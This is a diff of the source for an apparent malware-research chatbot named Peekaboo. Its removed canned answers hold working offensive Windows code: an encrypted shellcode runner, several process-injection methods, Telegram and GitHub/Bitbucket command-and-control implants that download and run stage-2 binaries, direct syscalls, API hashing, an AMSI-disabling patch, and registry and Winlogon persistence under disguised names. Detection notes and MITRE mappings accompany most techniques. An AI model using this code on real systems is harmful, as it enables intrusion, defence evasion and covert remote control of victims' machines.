-// msfvenom -p windows/x64/exec CMD=calc.exe -f c
-unsigned char sc[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...";
-unsigned char key[] = "\xde\xad\xbe\xef\x13\x37\xc0\xde";
-
-void xor_crypt(unsigned char *buf, size_t len) {
-    for (size_t i = 0; i < len; i++)
-        buf[i] ^= key[i % sizeof(key)];
-}
-
-int main(void) {
-    xor_crypt(sc, sizeof(sc));
-    LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
-                              MEM_COMMIT | MEM_RESERVE,
-                              PAGE_EXECUTE_READWRITE);
-    RtlMoveMemory(mem, sc, sizeof(sc));
-    ((void(*)())mem)();
-    return 0;
-}
-```
-
-Every module ships with a matching blog post explaining mechanics, telemetry, and SIGMA detection rules. Use the **Module Library** panel to browse all techniques, or **PE Inspector** to analyse compiled samples.
-
-**MITRE:** T1059.003, T1027, T1106"""
+Ask me any technical question - I'll pull context from the knowledge base and give a code-level answer."""
     ),
 
-    # -- Process Injection -----------------------------------------------------
+    # 2. What model / provider? ----------------------------------------------------
     (
-        r"process inject|injection technique|virtualalloc|enumerate desktop|apc inject",
-        """## Process Injection Techniques
-
-Peekaboo covers five injection primitives - each with a different EDR detection profile.
-
----
-
-### 1. Classic VirtualAllocEx + CreateRemoteThread (`injection-1`) - T1055.001
-
-The textbook injection. Heavily monitored but still effective against legacy EDRs.
-
-```c
-HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
-
-// allocate an RWX page inside the target process
-LPVOID mem = VirtualAllocEx(hProc, NULL, payload_len,
-                            MEM_COMMIT | MEM_RESERVE,
-                            PAGE_EXECUTE_READWRITE);
-// write shellcode across process boundary
-WriteProcessMemory(hProc, mem, payload, payload_len, NULL);
-
-// kick a remote thread at that address
-CreateRemoteThread(hProc, NULL, 0,
-                   (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
-CloseHandle(hProc);
-```
-
-**Detection:** Sysmon EID 10 (`OpenProcess`) + EID 8 (`CreateRemoteThread`) on the same target PID.
-
----
-
-### 2. EnumDesktopsA callback (`injection-2`) - T1055.012
-
-Shellcode runs inside a legitimate `user32.dll` callback - no remote thread created.
-
-```c
-LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
-                          MEM_COMMIT | MEM_RESERVE,
-                          PAGE_EXECUTE_READWRITE);
-RtlMoveMemory(mem, my_payload, sizeof(my_payload));
-
-// Windows calls mem() as a callback for each desktop name
-EnumDesktopsA(GetProcessWindowStation(),
-              (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
-```
-
-**Detection:** `VirtualAlloc(RWX)` immediately followed by `EnumDesktopsA` - unusual pair; Sysmon EID 7 (ImageLoad) won't fire, but memory-scanning EDRs can catch the RWX page.
-
----
-
-### 3. APC Injection (`injection-3`) - T1055.004
-
-Queues shellcode as an Asynchronous Procedure Call into an alertable thread.
-
-```c
-HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,   FALSE, tid);
-
-// write payload into target address space
-LPVOID mem = VirtualAllocEx(hProc, NULL, payload_len,
-                            MEM_COMMIT | MEM_RESERVE,
-                            PAGE_EXECUTE_READWRITE);
-WriteProcessMemory(hProc, mem, payload, payload_len, NULL);
-
-// queue APC - fires when thread enters alertable wait
-// (SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx)
-QueueUserAPC((PAPCFUNC)mem, hThread, NULL);
-
-// if target thread is suspended, resume it so APC fires
-ResumeThread(hThread);
-```
-
-**Detection:** `QueueUserAPC` targeting threads in remote processes; use ETW provider `Microsoft-Windows-Kernel-Process` - Sysmon doesn't log this natively.
-
----
-
-**MITRE coverage:** T1055, T1055.001, T1055.004, T1055.012"""
-    ),
-
-    # -- Telegram C2 ----------------------------------------------------------
-    (
-        r"telegram c2|telegram bot|c2 channel|command and control",
-        """## Telegram C2 Channel (`c2-telegram-1`)
-
-Peekaboo uses Telegram's Bot API as a covert C2 channel - all traffic is legitimate HTTPS to `api.telegram.org`.
-
-### Architecture
-
-```
-Operator --[sendMessage / sendDocument]--► Telegram Bot API
-                                                 │
-Implant ◄--[getUpdates long-poll, 30 s]----------┘
-```
-
-### Implant polling loop (C)
-
-```c
-#include <windows.h>
-#include <wininet.h>
-#pragma comment(lib, "wininet.lib")
-
-#define TOKEN    "7123456789:AAF-xxxxxxxxxxxxxxxxxxxx"
-#define BASE_URL "https://api.telegram.org/bot" TOKEN
-
-void c2_loop(void) {
-    HINTERNET hNet = InternetOpen("Mozilla/5.0",
-                                   INTERNET_OPEN_TYPE_DIRECT,
-                                   NULL, NULL, 0);
-    long last_id = 0;
-    char url[512];
-
-    while (1) {
-        // long-poll: blocks up to 30 s, returns only new updates
-        snprintf(url, sizeof(url),
-            BASE_URL "/getUpdates?offset=%ld&timeout=30", last_id + 1);
-
-        HINTERNET hConn = InternetOpenUrlA(
-            hNet, url, NULL, 0,
-            INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
-
-        if (hConn) {
-            char buf[8192] = {0};
-            DWORD n = 0;
-            InternetReadFile(hConn, buf, sizeof(buf) - 1, &n);
-            // parse JSON: extract update_id + message.text
-            // "!drop" => download and exec binary attachment
-            process_update(buf, &last_id);
-            InternetCloseHandle(hConn);
-        }
-        Sleep(5000);
-    }
-}
-```
-
-### Binary delivery - operator side (Python)
-
-```python
-import requests
-
-TOKEN   = "7123456789:AAF-xxxxxxxxxxxxxxxxxxxx"
-CHAT_ID = "-100123456789"
-
-def drop_binary(path: str, caption: str = "update.exe") -> None:
-    url  = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-    data = {"chat_id": CHAT_ID, "caption": caption}
-    with open(path, "rb") as f:
-        r = requests.post(url, data=data, files={"document": f})
-    print("sent:", r.json().get("ok"))
-
-drop_binary("builds/implant_enc.exe")
-```
-
-**Why it evades detection:**
-- Traffic is valid HTTPS to `api.telegram.org` (widely whitelisted CDN)
-- No custom C2 domain - nothing to blocklist
-- Beaconing interval jitter mimics human interaction
-
-**MITRE:** T1102 (Web Service), T1071.001 (App Layer Protocol), T1105 (Ingress Tool Transfer)
-
-**Detection:** Sysmon EID 3 - network connections to `api.telegram.org` from non-Telegram processes; consistent beaconing interval (e.g., every 5 s exactly); `InternetOpenUrlA` call stack tracing via ETW."""
-    ),
-
-    # -- AV / EDR Bypass -------------------------------------------------------
-    (
-        r"av evasion|edr bypass|antivirus|defender|amsi|syscall|evasion",
-        """## AV/EDR Bypass Layers
-
-Peekaboo layers three primitives to reduce the EDR telemetry footprint.
-
----
-
-### 1. Direct Syscalls (`evasion-syscall-1`) - T1106, T1562.001
-
-Most EDRs hook `ntdll.dll` exports in userland. Direct syscalls jump straight to the kernel, bypassing all hooks.
-
-```c
-// Step 1 - extract the syscall stub number (SSN) from ntdll at runtime
-DWORD get_ssn(const char *func_name) {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    BYTE   *fn    = (BYTE *)GetProcAddress(ntdll, func_name);
-    // un-hooked ntdll stub layout (x64):
-    //   4C 8B D1        mov r10, rcx
-    //   B8 XX 00 00 00  mov eax, <SSN>
-    if (fn[0] == 0x4c && fn[1] == 0x8b && fn[2] == 0xd1)
-        return *(DWORD *)(fn + 4);
-    // hooked? look for jmp trampoline, scan forward for the real stub
-    return 0;
-}
-
-// Step 2 - inline asm stub for NtAllocateVirtualMemory (SSN = 0x18 on Win10)
-__asm__(
-    "NtAllocVirt:          \n"
-    "  mov  r10, rcx       \n"   // calling convention: rcx -> r10
-    "  mov  eax, 0x18      \n"   // syscall number
-    "  syscall             \n"
-    "  ret                 \n"
-);
-```
-
----
-
-### 2. API Hashing (`evasion-hash-1`) - T1027.007
-
-Resolve WinAPI functions by hash at runtime - no function name strings in the binary.
-
-```c
-// FNV-1a 32-bit hash
-static DWORD fnv1a(const char *s) {
-    DWORD h = 0x811c9dc5;
-    while (*s) h = (h ^ (BYTE)*s++) * 0x01000193;
-    return h;
-}
-
-// walk kernel32.dll EAT and resolve by hash
-FARPROC resolve_by_hash(DWORD target) {
-    HMODULE base = GetModuleHandleA("kernel32.dll");
-    auto   *dos  = (IMAGE_DOS_HEADER *)base;
-    auto   *nt   = (IMAGE_NT_HEADERS *)((BYTE*)base + dos->e_lfanew);
-    auto   *exp  = (IMAGE_EXPORT_DIRECTORY *)
-        ((BYTE*)base + nt->OptionalHeader
-            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-
-    DWORD *names = (DWORD*)((BYTE*)base + exp->AddressOfNames);
-    WORD  *ords  = (WORD *) ((BYTE*)base + exp->AddressOfNameOrdinals);
-    DWORD *funcs = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);
-
-    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
-        const char *name = (char*)((BYTE*)base + names[i]);
-        if (fnv1a(name) == target)
-            return (FARPROC)((BYTE*)base + funcs[ords[i]]);
-    }
-    return NULL;
-}
-
-// usage - no string "VirtualAlloc" appears in binary
-typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
-auto VAlloc = (pVirtualAlloc)resolve_by_hash(0xd983e4a4);
-```
-
----
-
-### 3. AMSI Patch (`evasion-amsi-1`) - T1562.001
-
-Overwrite the `AmsiScanBuffer` prologue to force `AMSI_RESULT_CLEAN` - disables PowerShell/VBScript scanning without unloading the DLL.
-
-```c
-void patch_amsi(void) {
-    HMODULE amsi = LoadLibraryA("amsi.dll");
-    BYTE   *fn   = (BYTE *)GetProcAddress(amsi, "AmsiScanBuffer");
-
-    // patch 6 bytes: mov eax, E_INVALIDARG (0x80070057) ; ret
-    // AMSI callers treat any non-S_OK return as "clean"
-    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-
-    DWORD old = 0;
-    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
-    memcpy(fn, patch, sizeof(patch));
-    VirtualProtect(fn, sizeof(patch), old, &old);
-}
-```
-
-**Detection:**
-- `VirtualProtect` calls targeting `amsi.dll` address range - high signal
-- Memory integrity scan of `amsi.dll` in running processes
-- ETW `Microsoft-Windows-AMSI/Operational` log - EID 1101 scan suppressed
-- RWX pages in non-system processes (catch-all)"""
-    ),
-
-    # -- Payload Encryption ---------------------------------------------------
-    (
-        r"encrypt|encryption|speck|feal|mars|treyfer|xor|crypto|cipher|tea\b|xtea",
-        """## Payload Encryption
-
-Peekaboo uses lightweight block ciphers to encrypt shellcode. All run in pure userland - zero CryptoAPI calls.
-
----
-
-### XOR - baseline (simplest)
-
-```c
-void xor_crypt(unsigned char *buf, size_t len,
-               const unsigned char *key, size_t klen) {
-    for (size_t i = 0; i < len; i++)
-        buf[i] ^= key[i % klen];
-}
-
-unsigned char key[]     = "\xde\xad\xbe\xef\x13\x37\xc0\xde";
-unsigned char payload[] = { /* encrypted bytes */ };
-xor_crypt(payload, sizeof(payload), key, sizeof(key));
-// then VirtualAlloc + execute...
-```
-
----
-
-### Speck-64/128 (`crypto-speck-1`) - NSA lightweight cipher
-
-Fast on ARM/x86; 27 rounds; 64-bit block, 128-bit key.
-
-```c
-#include <stdint.h>
-#define SPECK_ROUNDS 27
-#define ROR64(x,r) (((x)>>(r))|((x)<<(64-(r))))
-#define ROL64(x,r) (((x)<<(r))|((x)>>(64-(r))))
-
-void speck_expand(const uint64_t key[2], uint64_t rk[SPECK_ROUNDS]) {
-    uint64_t a = key[1], b = key[0];
-    rk[0] = b;
-    for (int i = 0; i < SPECK_ROUNDS - 1; i++) {
-        a = (ROR64(a, 8) + b) ^ i;
-        b =  ROL64(b, 3)      ^ a;
-        rk[i + 1] = b;
-    }
-}
-
-void speck_encrypt(uint64_t *x, uint64_t *y,
-                   const uint64_t rk[SPECK_ROUNDS]) {
-    for (int i = 0; i < SPECK_ROUNDS; i++) {
-        *x  = (ROR64(*x, 8) + *y) ^ rk[i];
-        *y  =  ROL64(*y, 3)       ^ *x;
-    }
-}
-
-// encrypt shellcode buffer in 8-byte blocks
-void speck_encrypt_buf(uint8_t *buf, size_t len,
-                       const uint64_t key[2]) {
-    uint64_t rk[SPECK_ROUNDS];
-    speck_expand(key, rk);
-    for (size_t i = 0; i + 8 <= len; i += 8)
-        speck_encrypt((uint64_t*)(buf+i),
-                      (uint64_t*)(buf+i+4), rk);
-}
-```
-
----
-
-### TEA - Tiny Encryption Algorithm (`crypto-tea-1`)
-
-64-bit block, 128-bit key; 32 Feistel rounds; 15 lines of C.
-
-```c
-#include <stdint.h>
-
-void tea_encrypt(uint32_t v[2], const uint32_t k[4]) {
-    uint32_t v0 = v[0], v1 = v[1], sum = 0;
-    const uint32_t delta = 0x9e3779b9;
-    for (int i = 0; i < 32; i++) {
-        sum += delta;
-        v0  += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
-        v1  += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
-    }
-    v[0] = v0; v[1] = v1;
-}
-
-void tea_decrypt(uint32_t v[2], const uint32_t k[4]) {
-    uint32_t v0 = v[0], v1 = v[1];
-    uint32_t sum = 0xC6EF3720;  // delta * 32
-    const uint32_t delta = 0x9e3779b9;
-    for (int i = 0; i < 32; i++) {
-        v1  -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
-        v0  -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
-        sum -= delta;
-    }
-    v[0] = v0; v[1] = v1;
-}
-```
-
-**MITRE:** T1027 (Obfuscated Files or Information), T1140 (Deobfuscate/Decode at Runtime)
-
-**Detection:** Entropy analysis - encrypted blobs have Shannon entropy > 7.0 (vs ~4.5 for plaintext code). Tools: `binwalk -E`, Detect-It-Easy (die), PE-bear entropy view, YARA rules for high-entropy `.text` sections."""
-    ),
-
-    # -- MITRE ATT&CK ---------------------------------------------------------
-    (
-        r"mitre att.?ck|mitre\b|att&ck|\bttps?\b|tactic\b|t1\d{3}",
-        """## MITRE ATT&CK Coverage
-
-### Technique mapping
-
-| Tactic | ID | Name | Peekaboo module |
-|---|---|---|---|
-| Execution | T1059.003 | Windows Command Shell | shellcode runners |
-| Execution | T1106 | Native API | syscall modules |
-| Persistence | T1547.001 | Registry Run Keys | malware-pers-1 |
-| Persistence | T1547.004 | Winlogon Helper DLL | malware-pers-2 |
-| Persistence | T1574.001 | DLL Search Order Hijacking | malware-pers-3 |
-| Defense Evasion | T1027 | Obfuscated Files | crypto-* |
-| Defense Evasion | T1027.007 | Dynamic API Resolution | evasion-hash |
-| Defense Evasion | T1055.001 | Virtual Memory Injection | injection-1 |
-| Defense Evasion | T1055.004 | APC Injection | injection-3 |
-| Defense Evasion | T1055.012 | Process Hollowing | injection-2 |
-| Defense Evasion | T1562.001 | Disable/Modify Tools | evasion-amsi |
-| C2 | T1071.001 | Web Protocols | telegram, github |
-| C2 | T1102 | Web Service | telegram, bitbucket |
-| Exfiltration | T1041 | C2 channel exfil | stealer modules |
-
-### SIGMA rule - Registry Run key persistence
-
-```yaml
-title: Suspicious Registry Run Key Written by Non-Standard Process
-status: experimental
-logsource:
-    category: registry_set
-    product: windows
-detection:
-    selection:
-        EventType: SetValue
-        TargetObject|contains:
-            - 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
-            - 'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
-        Details|endswith:
-            - '.exe'
-            - '.dll'
-            - '.bat'
-    filter_legit:
-        Image|startswith:
-            - 'C:\\Program Files\\'
-            - 'C:\\Windows\\System32\\'
-            - 'C:\\Windows\\SysWOW64\\'
-    condition: selection and not filter_legit
-falsepositives:
-    - Software installers writing Run keys from temp dirs
-level: medium
-tags:
-    - attack.persistence
-    - attack.t1547.001
-```
-
-Use the **MITRE ATT&CK** panel to browse all 150+ technique groups and see which modules have ✓ coverage."""
-    ),
-
-    # -- Persistence -----------------------------------------------------------
-    (
-        r"persistence|registry|run key|winlogon|startup|dll hijack|screensaver",
-        """## Persistence Techniques
-
-Four primitives with escalating stealth - from noisy Run keys to silent DLL hijacks.
-
----
-
-### 1. Registry Run Key (`malware-pers-1`) - T1547.001
-
-Easiest and noisiest. Executes implant on every user logon.
-
-```c
-#include <windows.h>
-
-BOOL set_run_key(const char *name, const char *path) {
-    HKEY  hKey;
-    LONG  res = RegOpenKeyExA(
-        HKEY_CURRENT_USER,
-        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
-        0, KEY_SET_VALUE, &hKey);
-    if (res != ERROR_SUCCESS) return FALSE;
-
-    res = RegSetValueExA(hKey, name, 0, REG_SZ,
-                         (const BYTE *)path, strlen(path) + 1);
-    RegCloseKey(hKey);
-    return res == ERROR_SUCCESS;
-}
-
-// payload lives in a plausible-looking location
-set_run_key("WindowsDefenderUpdate",
-    "C:\\\\Users\\\\Public\\\\svchost32.exe");
-```
-
-**Detection:** Sysmon EID 13 (Registry value set) on `CurrentVersion\\Run`.
-
----
-
-### 2. Winlogon Helper DLL (`malware-pers-2`) - T1547.004
-
-Requires admin. Injects into Winlogon shell on every interactive logon.
-
-```c
-// read current shell value, append implant
-HKEY  hKey;
-char  current[512] = {0};
-DWORD sz = sizeof(current);
-RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-    "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
-    0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
-
-RegQueryValueExA(hKey, "Shell", NULL, NULL,
-                 (BYTE*)current, &sz);
-
-// append path - Windows executes both
-char newval[600];
-snprintf(newval, sizeof(newval),
-         "%s,C:\\\\ProgramData\\\\evil.exe", current);
-RegSetValueExA(hKey, "Shell", 0, REG_SZ,
-               (BYTE*)newval, strlen(newval) + 1);
-RegCloseKey(hKey);
-```
-
-**Detection:** Monitor `Winlogon\\Shell` for comma-separated values or non-`explorer.exe` entries.
-
----
-
-### 3. Screensaver Hijacking (`malware-pers-4`) - T1546.002
-
-No admin required. Replaces the screensaver binary path in user hive.
-
-```c
-RegOpenKeyExA(HKEY_CURRENT_USER,
-    "Control Panel\\\\Desktop", 0, KEY_SET_VALUE, &hKey);
-// point SCRNSAVE.EXE at payload
-RegSetValueExA(hKey, "SCRNSAVE.EXE", 0, REG_SZ,
-    (BYTE*)"C:\\\\Users\\\\Public\\\\update.scr",
-    strlen("C:\\\\Users\\\\Public\\\\update.scr") + 1);
-// ensure screensaver is enabled
-RegSetValueExA(hKey, "ScreenSaveActive", 0, REG_SZ,
-    (BYTE*)"1", 2);
-RegCloseKey(hKey);
-```
-
-**Detection:** `Control Panel\\Desktop\\SCRNSAVE.EXE` pointing outside `System32`; Sysmon EID 13.
-
----
-
-**MITRE:** T1547.001, T1547.004, T1546.002, T1574.001"""
-    ),
-
-    # -- GitHub / Bitbucket C2 ------------------------------------------------
-    (
-        r"github c2|gist|github issue|bitbucket c2|covert channel",
-        """## GitHub / Bitbucket Covert C2
-
-Both channels abuse legitimate developer platforms - defenders must block entire services to stop them.
-
----
-
-### GitHub Issues C2 (`c2-github-1`) - T1102, T1071.001
-
-Operator posts commands as Issue comments; implant polls and parses them.
-
-```c
-// implant: GET latest comment on issue #42
-// Authorization: token ghp_xxxxxxxxxxxxx
-
-#define GH_ENDPOINT \\
-    "https://api.github.com/repos/victim-org/cfg/issues/42/comments"
-
-HINTERNET h = InternetOpenUrlA(hNet, GH_ENDPOINT,
-    "Authorization: token ghp_xxx\\r\\n"
-    "User-Agent: GitUpdater/1.0\\r\\n",
-    -1L, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
-
-char buf[32768] = {0}; DWORD n = 0;
-InternetReadFile(h, buf, sizeof(buf) - 1, &n);
-// parse last element's "body" field - exec as shell command or download URL
-const char *cmd = json_last_string(buf, "body");
-if (cmd && cmd[0] == '!') handle_command(cmd + 1);
-```
-
-**Operator posts (Python):**
-
-```python
-import requests
-
-HEADERS = {
-    "Authorization": "token ghp_xxxxxxxxxxxxx",
-    "Accept": "application/vnd.github.v3+json",
-}
-URL = "https://api.github.com/repos/victim-org/cfg/issues/42/comments"
-
-# send drop command with stage-2 URL
-requests.post(URL, headers=HEADERS,
-              json={"body": "!drop https://cdn.example.com/s2.exe"})
-```
-
----
-
-### Bitbucket C2 (`c2-bitbucket-1`) - T1102, T1132.001
-
-Implant polls a repo file; operator pushes new payload as a base64-encoded commit.
-
-```c
-// base64-encoded "workspace:app_password" in implant config
-const char *bb_token_b64 = "d29ya3NwYWNlOnBhc3M="; // obfuscated
-
-// GET latest src/payload.bin from default branch
-// Authorization: Basic <bb_token_b64>
-const char *url =
-    "https://api.bitbucket.org/2.0/repositories/"
-    "workspace/cfg-repo/src/main/payload.bin";
-
-// download, base64-decode, write to %TEMP%, execute
-```
-
-**MITRE:** T1102 (Web Service), T1071.001 (App Layer), T1132.001 (Base64 Encoding)
-
-**Detection:**
-- Periodic `api.github.com` / `api.bitbucket.org` connections from non-developer processes
-- Fixed-interval polling (Sysmon EID 3, filter by destination host)
-- User-Agent strings that don't match known browsers or `git.exe`
-- `Authorization: token` headers in network captures (Zeek/Suricata)"""
-    ),
-
-    # -- Shellcode loading -----------------------------------------------------
-    (
-        r"shellcode|shellcod|shellcoding|msfvenom|payload dropp|loader",
-        """## Shellcode Loading Techniques
-
-Three loaders with increasing stealth - from obvious RWX pages to W^X section mapping.
-
----
-
-### 1. Classic RWX loader (high noise)
-
-```c
-#include <windows.h>
-
-// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
-unsigned char sc[] = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00...";
-
-int main(void) {
-    LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
-                              MEM_COMMIT | MEM_RESERVE,
-                              PAGE_EXECUTE_READWRITE);  // RWX - loud
-    if (!mem) return 1;
-    RtlMoveMemory(mem, sc, sizeof(sc));
-    ((void(*)())mem)();   // call shellcode as function pointer
-    return 0;
-}
-```
-
-**Detection:** `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` in a single call - highest signal; most EDRs alert immediately.
-
----
-
-### 2. W^X loader - write then flip permissions (medium noise)
-
-```c
-// 1. Allocate RW - never simultaneously writable AND executable
-LPVOID mem = VirtualAlloc(NULL, sizeof(sc),
-                          MEM_COMMIT | MEM_RESERVE,
-                          PAGE_READWRITE);
-memcpy(mem, sc, sizeof(sc));
-
-// 2. Flip to execute-only
-DWORD old;
-VirtualProtect(mem, sizeof(sc), PAGE_EXECUTE_READ, &old);
-
-// 3. Run on a new thread
-HANDLE t = CreateThread(NULL, 0,
-               (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
-WaitForSingleObject(t, INFINITE);
-VirtualFree(mem, 0, MEM_RELEASE);
-```
-
-**Detection:** `VirtualAlloc(RW)` immediately followed by `VirtualProtect(RX)` on the same address; medium signal.
-
----
-
-### 3. NtMapViewOfSection loader - no VirtualAllocEx (low noise)
-
-```c
-#include <winternl.h>
-
-// avoids VirtualAllocEx entirely - creates a named section object,
-// maps it RW, writes shellcode, remaps as RX
-HANDLE    hSection  = NULL;
-SIZE_T    viewSize  = 0;
-PVOID     base      = NULL;
-LARGE_INTEGER sz    = { .QuadPart = sizeof(sc) };
-
-NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sz,
-                PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
-
-NtMapViewOfSection(hSection, GetCurrentProcess(), &base,
-                   0, sizeof(sc), NULL, &viewSize,
-                   ViewShare, 0, PAGE_READWRITE);
-
-memcpy(base, sc, sizeof(sc));
-
-// remap as execute-read (no VirtualProtect call)
-NtUnmapViewOfSection(GetCurrentProcess(), base);
-NtMapViewOfSection(hSection, GetCurrentProcess(), &base,
-                   0, sizeof(sc), NULL, &viewSize,
-                   ViewShare, 0, PAGE_EXECUTE_READ);
-
-((void(*)())base)();
-```
-
-**MITRE:** T1055 (Process Injection), T1106 (Native API), T1027 (Obfuscated Payload)
-
-**Detection:** `NtCreateSection` + `NtMapViewOfSection` from non-system processes - low noise but catchable via ETW `Microsoft-Windows-Kernel-Memory`; memory integrity scanners walking VAD tree."""
-    ),
-
-    # -- AI providers ---------------------------------------------------------
-    (
-        r"what model|which (llm|model|ai)|ollama model|qwen|provider",
+        r"what model|which (llm|model|ai|provider)|what provider|ollama model|qwen",
         """## AI Assistant Providers
 
-Switch between providers using the buttons in the chat input bar.
-
-| Provider | Model | Mode | Best for |
+| Provider | Model | Mode | Strength |
 |---|---|---|---|
-| **Claude** | `claude-opus-4-6` | API, streaming | Best reasoning; extended thinking; full KB cached |
-| **Gemini** | `gemini-2.0-flash` | API, streaming | Fast responses; full KB injected as system prompt |
-| **Ollama** | `qwen3:1.7b` | Local, offline | Air-gapped demo; RAG over top-6 posts |
+| **Claude** | `claude-opus-4-6` | API + streaming | Best reasoning; extended thinking; full KB prompt-cached |
+| **Gemini** | `gemini-2.0-flash` | API + streaming | Fast; full KB injected as system prompt |
+| **Ollama** | `qwen3:0.6b` (default) | Local / offline | Air-gapped; RAG over top-3 KB posts |
 
-### Ollama RAG pipeline
+Switch with the provider buttons below the chat input.
 
+### Claude - prompt-cache detail
+The full knowledge base (~80 k tokens) is sent as a `cache_control: ephemeral` block. Billed once per 5-minute TTL - multi-turn sessions cost ~90 % less.
+
+### Ollama - RAG pipeline
 ```
-User question
-     │
-     ▼  embed with nomic-embed-text (768-dim)
-     │
-     ▼  cosine similarity vs all KB post embeddings
-     │
-     ▼  top-6 most relevant posts selected
-     │
-     ▼  injected into qwen3:1.7b system prompt
-     │
-     ▼  streamed answer (/no_think - fast mode)
+question -> nomic-embed-text (768-dim) -> cosine similarity
+         -> top-3 KB posts -> qwen3 system prompt -> streamed answer
 ```
 
-### Claude prompt-cache optimisation
+**Setup:** add API keys to `config/anthropic_config.json` / `config/gemini_config.json`. For Ollama see *"How to set up Ollama?"*."""
+    ),
 
-The full knowledge base (~80 k tokens) is sent as a **cached system prompt block** (`cache_control: ephemeral`). It is only billed once per 5-minute TTL window, making multi-turn sessions ~90 % cheaper.
+    # 3. Help / capabilities -------------------------------------------------------
+    (
+        r"help|what can (you|this assistant) do|capabilities|commands|how (do i|to) use",
+        """## Peekaboo AI - What You Can Ask
 
-```python
-# chatbot.py - how the cache block is constructed
-system = [
-    {"type": "text", "text": _SYSTEM_BASE},
-    {"type": "text", "text": kb_text,
-     "cache_control": {"type": "ephemeral"}},  # cached separately
-]
+I answer technical questions grounded in the **~/hacking/meow** codebase. Every response includes code, MITRE IDs, and a detection note.
+
+### Topics I cover well
+
+- **Injection** - VirtualAllocEx, APC, EnumDesktopsA, section mapping, hollowing
+- **Persistence** - Registry Run, Winlogon, screensaver, DLL hijacking, scheduled tasks
+- **C2 channels** - Telegram, GitHub Issues, Bitbucket, VirusTotal, Discord/Slack abuse
+- **AV/EDR bypass** - direct syscalls, API hashing, AMSI patching, ETW patching, unhooking
+- **Payload crypto** - Speck, TEA, XTEA, FEAL-8, MARS, Treyfer, XOR, and 10+ more
+- **Binary analysis** - PE anatomy, entropy, imports, ROP gadgets, shellcode emulation
+- **Detection engineering** - SIGMA rules, Sysmon EIDs, ETW providers, telemetry
+
+### Example questions
+
+- *"How does EnumDesktopsA injection work?"*
+- *"Show me Speck-64 encryption for a shellcode buffer"*
+- *"What Sysmon events catch Registry Run key persistence?"*
+- *"Explain the Hell's Gate SSN extraction approach"*
+
+Switch provider with the buttons below. For Ollama (offline RAG) see *"How to set up Ollama?"*."""
+    ),
+
+    # 4. How to set up Ollama? -----------------------------------------------------
+    (
+        r"(how|setup|set up|install|configure).{0,30}ollama|ollama.{0,20}(setup|install|configure|run|start)",
+        """## Setting Up Ollama (local / offline mode)
+
+### 1. Install Ollama
+```bash
+# Linux / WSL
+curl -fsSL https://ollama.com/install.sh | sh
+
+# macOS
+brew install ollama
 ```
 
-**To set up:** add keys to `config/anthropic_config.json` or `config/gemini_config.json` in the **Settings** panel. For Ollama: `ollama pull qwen3:1.7b && ollama pull nomic-embed-text`."""
+### 2. Pull required models
+```bash
+ollama pull qwen3:0.6b          # chat model (~400 MB)
+ollama pull nomic-embed-text    # embeddings for RAG (~270 MB)
+```
+
+### 3. Start the server
+```bash
+ollama serve   # listens on http://localhost:11434
+```
+
+### 4. Configure Peekaboo
+Edit `config/ollama_config.json`:
+```json
+{
+  "base_url":    "http://localhost:11434",
+  "model":       "qwen3:0.6b",
+  "temperature": 0.2,
+  "num_ctx":     2048,
+  "num_predict": 384
+}
+```
+
+### 5. Select Ollama in the chat bar
+Click the **Ollama** button. The RAG pipeline kicks in automatically - your question is embedded, top-3 relevant posts are retrieved from the knowledge base, and qwen3 generates a streamed answer with no internet connection required.
+
+> **Tip:** build the knowledge base first (`peekaboo.py kb index`) so RAG has posts to retrieve from."""
+    ),
+
+    # 5. What can this assistant do? -----------------------------------------------
+    (
+        r"what (can|does|will) (this assistant|peekaboo ai|you) (do|know|answer|help)",
+        """## Peekaboo AI Assistant - Capabilities
+
+I'm a technical assistant specialised in malware research and threat simulation. I answer questions grounded in the **~/hacking/meow** codebase - real, working code with full MITRE ATT&CK and detection context.
+
+**Ask me about:**
+- Injection techniques and memory allocation patterns
+- C2 channel implementations (Telegram, GitHub, Bitbucket, VirusTotal)
+- AV/EDR bypass (syscalls, API hashing, AMSI/ETW patching, unhooking)
+- Payload encryption (10+ ciphers from the crypto/ directory)
+- Persistence primitives (Registry, Winlogon, DLL hijacking, screensaver)
